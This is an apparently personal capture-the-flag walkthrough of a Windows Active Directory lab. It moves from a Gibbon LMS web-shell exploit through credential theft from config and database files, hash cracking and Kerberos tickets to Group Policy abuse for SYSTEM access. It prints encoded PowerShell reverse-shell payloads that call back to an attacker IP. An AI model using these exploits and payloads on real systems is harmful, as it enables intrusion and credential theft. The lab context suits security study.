## TheFrizz

### Lab Details 

- Difficulty: Medium
- Type: Active Directory, Windows

#### Enumeration
- run `nmap`
```bash
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-07 05:40:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
59560/tcp open  msrpc         Microsoft Windows RPC
59572/tcp open  msrpc         Microsoft Windows RPC
63982/tcp open  msrpc         Microsoft Windows RPC
```
- enumerating port 80, found endpoint `http://frizzdc.frizz.htb/home/`, there is staff login present, click on the staff login takes us to `http://frizzdc.frizz.htb/Gibbon-LMS/`
![[Gibbon.png]]
- from the bottom we can see the version of the web page which is `v25.0.00`

#### Initial Foothold 
- search online and found two POCs 
- LFI - https://github.com/maddsec/CVE-2023-34598
- RCE - https://github.com/davidzzo23/CVE-2023-45878
- both vulnerabilities work on target
- will choose RCE to get a reverse shell 
```bash
$ python3 CVE-2023-45878.py -t frizzdc.frizz.htb -s -i 10.10.14.82 -p 4444
[+] Uploading web shell as avzfpayn.php...
[+] Upload successful.
[+] Sending PowerShell reverse shell payload to http://frizzdc.frizz.htb/Gibbon-LMS/avzfpayn.php
[*] Make sure your listener is running: nc -lvnp 4444
[+] Executing command on: http://frizzdc.frizz.htb/Gibbon-LMS/avzfpayn.php?cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand CgAgACAAIAAgACQAYwBsAGkAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAiADEAMAAuADEAMAAuADEANAAuADgAMgAiACwANAA0ADQANAApADsACgAgACAAIAAgACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AAoAIAAgACAAIABbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AAoAIAAgACAAIAB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsACgAgACAAIAAgACAAIAAgACAAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsACgAgACAAIAAgACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAKACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAKACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7AAoAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAKACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQA7AAoAIAAgACAAIAB9AAoAIAAgACAAIAAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKACAAIAAgACAA
```
- we get reverse shell as `frizz\w.webservice`
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.232.168] 54719

PS C:\xampp\htdocs\Gibbon-LMS> whoami
frizz\w.webservice
```


#### Lateral Movement (If any)
- search for config file of the web app, found `db` connection credential
```php
PS C:\xampp\htdocs\Gibbon-LMS> cat config.php
<SNIP>
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';
<SNIP>
```
- load and run `winPEAS.exe`
- found `mysql.exe` is installed on target
```bash
════════════════════════════════════╣ Services Information ╠════════════════════════════════════

╔══════════╣ Interesting Services -non Microsoft-
╚ Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services

 mysql(mysql)[C:\xampp\mysql\bin\mysqld --defaults-file=C:\xampp\mysql\bin\my.ini mysql] - Auto - Running - No quotes and Space detected

PS C:\Users\w.Webservice> ls C:\xampp\mysql\bin\


    Directory: C:\xampp\mysql\bin


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
<SNIP>
-a----        10/30/2023   5:58 AM        3784616 mysql.exe
<SNIP>
```
- we can use it to interact with the database on target
- show databases
```powershell
c:\xampp\mysql\bin\mysql.exe -uMrGibbonsDB -pMisterGibbs!Parrot!?1 -e 'show databases;'
Database
gibbon
information_schema
test
```
- show tables
```powershell
c:\xampp\mysql\bin\mysql.exe -uMrGibbonsDB -pMisterGibbs!Parrot!?1 gibbon -e 'show tables;'
Tables_in_gibbon
gibbonaction
gibbonactivity
gibbonactivityattendance
gibbonactivityslot
gibbonactivitystaff
gibbonactivitystudent
gibbonactivitytype
gibbonadmissionsaccount
gibbonadmissionsapplication
```
- list entries in table
```powershell
c:\xampp\mysql\bin\mysql.exe -uMrGibbonsDB -pMisterGibbs!Parrot!?1 gibbon -e 'select * from gibbonperson;'
gibbonPersonID  title   surname firstName       preferredName   officialName    nameInCharacters        gender  username        passwordStrong        passwordStrongSalt      passwordForceReset      status  canLogin        gibbonRoleIDPrimary     gibbonRoleIDAll dob  email    emailAlternate  image_240       lastIPAddress   lastTimestamp   lastFailIPAddress       lastFailTimestamp       failCount    address1 address1District        address1Country address2        address2District        address2Country phone1Type      phone1CountryCode     phone1  phone3Type      phone3CountryCode       phone3  phone2Type      phone2CountryCode       phone2  phone4Type      phone4CountryCode     phone4  website languageFirst   languageSecond  languageThird   countryOfBirth  birthCertificateScan    ethnicity    religion profession      employer        jobTitle        emergency1Name  emergency1Number1       emergency1Number2       emergency1Relationship        emergency2Name  emergency2Number1       emergency2Number2       emergency2Relationship  gibbonHouseID   studentID    dateStart        dateEnd gibbonSchoolYearIDClassOf       lastSchool      nextSchool      departureReason transport       transportNotecalendarFeedPersonal     viewCalendarSchool      viewCalendarPersonal    viewCalendarSpaceBooking        gibbonApplicationFormID lockerNumber  vehicleRegistration     personalBackground      messengerLastRead       privacy dayType gibbonThemeIDPersonal   gibboni18nIDPersonal  studentAgreements       googleAPIRefreshToken   microsoftAPIRefreshToken        genericAPIRefreshToken  receiveNotificationEmails     mfaSecret       mfaToken        cookieConsent   fields
0000000001      Ms.     Frizzle Fiona   Fiona   Fiona Frizzle           Unspecified     f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03      /aACFhikmNopqrRTVz2489  N       Full    Y       001     001     NULL    f.frizzle@frizz.htb  NULL     NULL    ::1     2024-10-29 09:28:59     NULL    NULL    0                                                                    NULL             NULL    NULL    NULL                                                    Y       Y       N       NULL                 NULL     NULL    NULL    NULL    NULL    NULL                            Y       NULL    NULL    NULL
```
- we get hash of user `f.frizzle` in the database
- use `hashcat` to decrypt the hash
```bash
hashcat '067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489' -m 1420 /usr/share/wordlists/rockyou.txt

067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23
```
- `NTLM` is not available on the target we will need to interact with target using `Kerberos`
- get a `TGT` as user `f.frizzle` using `impacket` tool `getTGT.py`
```bash
$ getTGT.py -dc-ip frizzdc.frizz.htb frizz.htb/f.frizzle:'Jenni_Luvs_Magic23'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in f.frizzle.ccache
```
- need to add info regarding the target domain to `/etc/krb5.conf`
```bash
$ echo "[libdefaults]
 default_realm = FRIZZ.HTB
[realms]
 FRIZZ.HTB = {
 kdc = frizzdc.frizz.htb
 admin_server = frizzdc.frizz.htb
 }
[domain_realm]
 .frizz.htb = FRIZZ.HTB
 frizz.htb = FRIZZ.HTB" > /etc/krb5.conf
```
- we can then `ssh` to target as `f.frizzle`
```bash
$  ssh -K -o GSSAPIAuthentication=yes f.frizzle@frizz.htb
```
- look for hidden directories and found `$RECYCLE.BIN` in `C:\`
```bash
PS C:\> Get-ChildItem -Force 

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs           10/7/2025  3:10 PM                $RECYCLE.BIN
d--h-           3/10/2025  3:31 PM                $WinREAgent
d--hs           7/24/2025 12:41 PM                Config.Msi
l--hs          10/29/2024  9:12 AM                Documents and Settings -> C:\Users
d----           3/10/2025  3:39 PM                inetpub
d----            5/8/2021  1:15 AM                PerfLogs
d-r--           7/24/2025 12:41 PM                Program Files
d----            5/8/2021  2:34 AM                Program Files (x86)
d--h-           2/20/2025  2:50 PM                ProgramData
d--hs          10/29/2024  9:12 AM                Recovery
d--hs          10/29/2024  7:25 AM                System Volume Information
d-r--          10/29/2024  7:31 AM                Users
d----           3/10/2025  3:41 PM                Windows
d----          10/29/2024  7:28 AM                xampp
-a-hs          10/29/2024  8:27 AM          12288 DumpStack.log.tmp
```
- check items in `$RECYCLE.BIN`
```bash
PS C:\$RECYCLE.BIN> Get-ChildItem -Force

    Directory: C:\$RECYCLE.BIN

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs          10/29/2024  7:31 AM                S-1-5-21-2386970044-1145388522-2932701813-1103
d--hs           10/7/2025  3:10 PM                S-1-5-21-2386970044-1145388522-2932701813-1120
PS C:\$RECYCLE.BIN> dir S-1-5-21-2386970044-1145388522-2932701813-1103

    Directory: C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          10/29/2024  7:31 AM            148 $IE2XMEG.7z
-a---          10/24/2024  9:16 PM       30416987 $RE2XMEG.7z
```
- two are two zipped files in `$RECYCLE.BIN`
- use below method to decrypt and move it to user's own `Desktop` directory
```powershell
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> $shell = New-Object -ComObject Shell.Application                   
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> $recycleBin = $shell.Namespace(0xA)
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> $recycleBin.items() | Select-Object Name, Path

Name                  Path
----                  ----
wapt-backup-sunday.7z C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\$RE2XMEG.7z
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> $recycleBin = (New-Object -ComObject Shell.Application).NameSpace(0xA)
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> $items = $recycleBin.Items()                                       
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> $item = $items | Where-Object {$_.Name -eq "wapt-backup-sunday.7z"}
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> $documentsPath = [Environment]::GetFolderPath("Desktop")           
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> $documents = (New-Object -ComObject Shell.Application).NameSpace($documentsPath)
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> 
PS C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103> $documents.MoveHere($item) 
```
- need to move the zipped files back from remote
- tried `scp` did not work, `scp` failed to copy the entire file
```bash
scp -P 22 f.frizzle@frizz.htb:"C:/Users/f.frizzle/Desktop/wapt-backup-sunday.7z" .
$ ls -la
-rw-------  1 ch4os1 ch4os1   204800 Oct  7 19:05 .wapt-backup-sunday.7z
```
- alternatively we can move the zipped file to the web app directory which can be access directly via `URL`
- use below method 
```powershell
PS C:\Users\f.frizzle\Desktop> mkdir C:\Temp

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----           10/7/2025  5:10 PM                Temp
PS C:\Users\f.frizzle\Desktop> mv .\wapt-backup-sunday.7z C:\Temp\
PS C:\Users\f.frizzle\Desktop> cd C:\xampp\
PS C:\Temp>$filePath = "C:\Temp\wapt-backup-sunday.7z"
PS C:\Temp>$acl = Get-Acl -Path $filePath
PS C:\Temp>$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
PS C:\Temp>$acl.AddAccessRule($accessRule)
PS C:\Temp>Set-Acl -Path $filePath -AclObject $acl
```
```bash
$ wget http://frizzdc.frizz.htb/home/wapt-backup-sunday.7z
$ ls -la 
-rw-r--r--  1 ch4os1 ch4os1 30416987 Oct  7 19:17 wapt-backup-sunday.7z
```
- search for file containing password
```bash
grep -R 'password'
<SNIP>
conf/waptserver.ini:wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
</SNIP>
$ echo 'IXN1QmNpZ0BNZWhUZWQhUgo=' | base64 -d
!suBcig@MehTed!R
```
- found of user `m.schoolbus`  password 
```bash
getTGT.py -dc-ip frizzdc.frizz.htb frizz.htb/m.schoolbus:'!suBcig@MehTed!R'
```
- get `TGT` for user `m.schoolbus`
```bash
$ getTGT.py -dc-ip frizzdc.frizz.htb frizz.htb/m.schoolbus:'!suBcig@MehTed!R'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in m.schoolbus.ccache
```
- `ssh` to target as `m.schoolbus`
```bash
$  ssh -K -o GSSAPIAuthentication=yes m.schoolbus@frizz.htb
```
### Privilege Escalation
- check user group permissions
```bash
PS C:\Users\M.SchoolBus> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                   Type             SID                                            Attributes               

============================================ ================ ============================================== ===============================================================
Everyone                                     Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users              Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access   Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                         Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users             Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization               Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
frizz\Desktop Admins                         Group            S-1-5-21-2386970044-1145388522-2932701813-1121 Mandatory group, Enabled by default, Enabled group
frizz\Group Policy Creator Owners            Group            S-1-5-21-2386970044-1145388522-2932701813-520  Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity   Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
frizz\Denied RODC Password Replication Group Alias            S-1-5-21-2386970044-1145388522-2932701813-572  Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level       Label            S-1-16-8192    
```
- user belongs to `Group Policy Creator Owners`, we can abuse this permission to create a malicious `GPO` with admin privilege
- first create a new `GPO`
```powershell
PS C:\Users\M.SchoolBus> New-GPO -Name attack | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes           

GpoId       : 7878a519-68f5-4f92-927d-f8f3f0e06d1f
DisplayName : attack
Enabled     : True
Enforced    : False
Target      : OU=Domain Controllers,DC=frizz,DC=htb
Order       : 2
```
- then use `SharpGPOAbuse.exe` to add the GPO to `DC`
```powershell
PS C:\Users\M.SchoolBus> .\SharpGPOAbuse.exe --addcomputertask --gponame "attack" --author TCG --taskname Attack --command "powershell.exe" --arguments "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOAAyACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
[+] Domain = frizz.htb
[+] Domain Controller = frizzdc.frizz.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
[+] GUID of "attack" is: {7878A519-68F5-4F92-927D-F8F3F0E06D1F}
[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{7878A519-68F5-4F92-927D-F8F3F0E06D1F}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
```
- run `gpupdate /force` to forcefully update group policy
```powershell
PS C:\Users\M.SchoolBus> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
```
- we get  reverse shell as `nt authority\system` 
```bash
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.232.168] 51356
whoami
nt authority\system
```
#### Resources

#### Lesson Learned
